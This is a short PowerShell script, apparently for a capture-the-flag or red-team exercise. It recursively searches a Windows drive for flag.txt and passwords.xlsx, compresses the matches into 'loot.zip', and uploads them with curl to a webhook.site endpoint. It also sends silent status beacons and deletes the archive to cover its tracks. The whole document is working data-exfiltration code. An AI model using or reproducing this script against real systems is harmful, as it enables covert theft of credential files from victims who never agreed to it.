# HTTP Exfiltration Logic (Silent)

# 1. Configuration
$path = "C:\"
$targets = @("flag.txt", "passwords.xlsx")
$url = "https://webhook.site/YOUR_UNIQUE_ID"

# 2. Beacon (Silent)
# -s : Silent (no progress/errors)
# -o NUL : Discard output (response body)
curl.exe -s -o NUL "$url?status=started"

# 3. Search
$foundItems = Get-ChildItem -Path $path -Recurse -Include $targets -ErrorAction SilentlyContinue | Sort-Object -Property Name -Unique

if ($foundItems) {
    # 4. Zip
    $zipPath = "$env:TEMP\loot.zip"
    Compress-Archive -Path $foundItems.FullName -DestinationPath $zipPath -Force

    # 5. Exfiltrate (Silent)
    curl.exe -s -o NUL -F "file=@$zipPath" $url

    # 6. Cleanup
    Remove-Item $zipPath -ErrorAction SilentlyContinue
}
else {
    curl.exe -s -o NUL "$url?status=not_found"
}
